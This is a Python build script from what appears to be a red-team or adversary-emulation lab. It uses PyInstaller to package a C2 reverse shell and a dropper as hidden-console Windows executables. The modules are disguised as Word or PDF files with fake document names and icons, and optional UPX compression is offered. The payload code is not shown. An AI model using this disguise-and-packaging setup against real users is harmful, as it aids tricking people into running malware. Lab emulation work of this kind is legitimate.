#!/usr/bin/env python3
"""
Build Tool - Cyberfortress RedOps

CLI tool để build các script Python thành file .exe trên Windows sử dụng PyInstaller.

Usage:
    python build.py --help
    python build.py c2-outbound-connection
    python build.py c2-outbound-connection --onefile --noconsole
    python build.py all

Author: Cyberfortress Labs
"""

import argparse
import subprocess
import sys
import os
import shutil
from pathlib import Path
from typing import List, Optional

# ============================================================================
# CONFIGURATION
# ============================================================================

# Base directories
BASE_DIR = Path(__file__).parent.resolve()
SRC_DIR = BASE_DIR / "src"
DIST_DIR = BASE_DIR / "dist"
BUILD_DIR = BASE_DIR / "build"

# Available modules to build
MODULES = {
    "c2-outbound-connection": {
        "script": SRC_DIR / "c2-outbound-connection" / "c2_reverse_shell.py",
        "name": "c2_reverse_shell",
        "icon": None,  # Optional: path to .ico file
        "hidden_imports": [],
        "description": "C2 Reverse Shell - MITRE ATT&CK T1071",
        "noconsole": False,  # Show console for debugging
    },
    "c2-shell-word": {
        "script": SRC_DIR / "c2-outbound-connection" / "c2_reverse_shell.py",
        "name": "Meeting_Notes_2024",  # Fake Word document name
        "icon": SRC_DIR / "c2-outbound-connection" / "icons" / "word.ico",
        "hidden_imports": [],
        "description": "C2 Reverse Shell (Word Icon) - Stealth Mode",
        "noconsole": True,  # Hide console for stealth
    },
    "c2-shell-pdf": {
        "script": SRC_DIR / "c2-outbound-connection" / "c2_reverse_shell.py",
        "name": "Financial_Report_2024",  # Fake PDF document name
        "icon": SRC_DIR / "c2-outbound-connection" / "icons" / "pdf.ico",
        "hidden_imports": [],
        "description": "C2 Reverse Shell (PDF Icon) - Stealth Mode",
        "noconsole": True,
    },
    "dropper": {
        "script": SRC_DIR / "c2-outbound-connection" / "dropper.py",
        "name": "Invoice_2024",  # Fake document name
        "icon": SRC_DIR / "c2-outbound-connection" / "icons" / "word.ico",  # Word icon
        "hidden_imports": [],
        "description": "Fake Document Dropper - T1204.002 User Execution",
        "noconsole": True,  # Hide console for stealth
    },
    "dropper-pdf": {
        "script": SRC_DIR / "c2-outbound-connection" / "dropper.py",
        "name": "Report_Q4_2024",  # Fake PDF name
        "icon": SRC_DIR / "c2-outbound-connection" / "icons" / "pdf.ico",  # PDF icon
        "hidden_imports": [],
        "description": "Fake PDF Dropper - T1204.002 User Execution",
        "noconsole": True,
    },
}

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def print_banner():
    """Print the build tool banner."""
    banner = """
╔═══════════════════════════════════════════════════════════════════╗
║          CYBERFORTRESS REDOPS - BUILD TOOL                        ║
║          Build Python scripts to Windows EXE                      ║
╚═══════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def check_pyinstaller() -> bool:
    """Check if PyInstaller is installed."""
    try:
        import PyInstaller
        return True
    except ImportError:
        return False


def install_pyinstaller() -> bool:
    """Install PyInstaller using pip."""
    print("[*] Installing PyInstaller...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("[+] PyInstaller installed successfully!")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to install PyInstaller: {e}")
        return False


def clean_build_artifacts(module_name: str = None):
    """Clean up build artifacts."""
    print("[*] Cleaning build artifacts...")
    
    # Clean spec files
    for spec_file in BASE_DIR.glob("*.spec"):
        spec_file.unlink()
        print(f"    Removed: {spec_file.name}")
    
    # Clean build directory
    if BUILD_DIR.exists():
        shutil.rmtree(BUILD_DIR)
        print(f"    Removed: {BUILD_DIR}")
    
    print("[+] Clean complete!")


# ============================================================================
# BUILD FUNCTIONS
# ============================================================================

def build_module(
    module_key: str,
    onefile: bool = True,
    noconsole: bool = False,
    upx: bool = False,
    clean: bool = True
) -> bool:
    """
    Build a specific module to .exe.
    
    Args:
        module_key: Key of the module in MODULES dict
        onefile: Create a single executable file
        noconsole: Hide console window (for GUI apps)
        upx: Use UPX compression (requires UPX installed)
        clean: Clean build cache before building
        
    Returns:
        True if build successful, False otherwise
    """
    if module_key not in MODULES:
        print(f"[-] Unknown module: {module_key}")
        print(f"    Available modules: {', '.join(MODULES.keys())}")
        return False
    
    module = MODULES[module_key]
    script_path = module["script"]
    output_name = module["name"]
    
    # Verify script exists
    if not script_path.exists():
        print(f"[-] Script not found: {script_path}")
        return False
    
    print(f"\n[*] Building: {module['description']}")
    print(f"    Script: {script_path}")
    print(f"    Output: {output_name}.exe")
    print()
    
    # Build PyInstaller command
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--name", output_name,
        "--distpath", str(DIST_DIR / module_key),
        "--workpath", str(BUILD_DIR),
        "--specpath", str(BUILD_DIR),
    ]
    
    # Add options
    if onefile:
        cmd.append("--onefile")
    
    # Use module's noconsole setting if defined, otherwise use CLI argument
    use_noconsole = module.get("noconsole", noconsole) or noconsole
    if use_noconsole:
        cmd.append("--noconsole")
    
    if upx:
        cmd.append("--upx-dir")
        cmd.append("upx")  # Assumes UPX is in PATH or ./upx directory
    
    if clean:
        cmd.append("--clean")
    
    # Add icon if specified
    if module.get("icon") and Path(module["icon"]).exists():
        cmd.extend(["--icon", str(module["icon"])])
    
    # Add hidden imports
    for hidden_import in module.get("hidden_imports", []):
        cmd.extend(["--hidden-import", hidden_import])
    
    # Add the script
    cmd.append(str(script_path))
    
    # Execute build
    print(f"[*] Running: {' '.join(cmd)}\n")
    
    try:
        result = subprocess.run(cmd, check=True)
        
        # Verify output
        if onefile:
            exe_path = DIST_DIR / module_key / f"{output_name}.exe"
        else:
            exe_path = DIST_DIR / module_key / output_name / f"{output_name}.exe"
        
        if exe_path.exists():
            file_size = exe_path.stat().st_size / (1024 * 1024)  # Size in MB
            print(f"\n[+] Build successful!")
            print(f"    Output: {exe_path}")
            print(f"    Size: {file_size:.2f} MB")
            return True
        else:
            print(f"\n[-] Build completed but output not found at expected path")
            return False
            
    except subprocess.CalledProcessError as e:
        print(f"\n[-] Build failed with error code: {e.returncode}")
        return False
    except Exception as e:
        print(f"\n[-] Build failed: {e}")
        return False


def build_all(onefile: bool = True, noconsole: bool = False) -> dict:
    """Build all available modules."""
    results = {}
    
    for module_key in MODULES:
        success = build_module(module_key, onefile=onefile, noconsole=noconsole)
        results[module_key] = success
    
    return results


def list_modules():
    """List all available modules."""
    print("\nAvailable modules:\n")
    
    for key, module in MODULES.items():
        script_exists = "✓" if module["script"].exists() else "✗"
        print(f"  [{script_exists}] {key}")
        print(f"      {module['description']}")
        print(f"      Script: {module['script']}")
        print()


# ============================================================================
# CLI INTERFACE
# ============================================================================

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Build Python scripts to Windows EXE files",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python build.py --list                          # List available modules
  python build.py c2-outbound-connection          # Build single module
  python build.py c2-outbound-connection --noconsole  # Build without console
  python build.py all                             # Build all modules
  python build.py --clean                         # Clean build artifacts
        """
    )
    
    parser.add_argument(
        'module',
        nargs='?',
        help='Module to build (use "all" to build everything)'
    )
    
    parser.add_argument(
        '-l', '--list',
        action='store_true',
        help='List available modules'
    )
    
    parser.add_argument(
        '--onefile',
        action='store_true',
        default=True,
        help='Create a single executable file (default: True)'
    )
    
    parser.add_argument(
        '--onedir',
        action='store_true',
        help='Create a directory with executable and dependencies'
    )
    
    parser.add_argument(
        '--noconsole',
        action='store_true',
        help='Hide console window (for GUI applications)'
    )
    
    parser.add_argument(
        '--upx',
        action='store_true',
        help='Use UPX compression (requires UPX installed)'
    )
    
    parser.add_argument(
        '--clean',
        action='store_true',
        help='Clean build artifacts only (no build)'
    )
    
    parser.add_argument(
        '--no-clean',
        action='store_true',
        help='Skip cleaning before build'
    )
    
    return parser.parse_args()


def main():
    """Main entry point."""
    print_banner()
    args = parse_arguments()
    
    # Handle --list
    if args.list:
        list_modules()
        return 0
    
    # Handle --clean only
    if args.clean and not args.module:
        clean_build_artifacts()
        return 0
    
    # Require module name for building
    if not args.module:
        print("[-] No module specified. Use --list to see available modules.")
        print("    Usage: python build.py <module_name>")
        return 1
    
    # Check PyInstaller
    if not check_pyinstaller():
        print("[-] PyInstaller not found.")
        response = input("[?] Install PyInstaller now? (y/n): ").strip().lower()
        if response == 'y':
            if not install_pyinstaller():
                return 1
        else:
            print("[-] Cannot build without PyInstaller.")
            return 1
    
    # Determine onefile setting
    onefile = not args.onedir
    
    # Build
    if args.module.lower() == 'all':
        print("[*] Building all modules...\n")
        results = build_all(onefile=onefile, noconsole=args.noconsole)
        
        print("\n" + "="*60)
        print("BUILD SUMMARY")
        print("="*60)
        
        success_count = sum(1 for v in results.values() if v)
        total_count = len(results)
        
        for module, success in results.items():
            status = "✓ SUCCESS" if success else "✗ FAILED"
            print(f"  {module}: {status}")
        
        print(f"\nTotal: {success_count}/{total_count} successful")
        return 0 if success_count == total_count else 1
    else:
        success = build_module(
            args.module,
            onefile=onefile,
            noconsole=args.noconsole,
            upx=args.upx,
            clean=not args.no_clean
        )
        return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
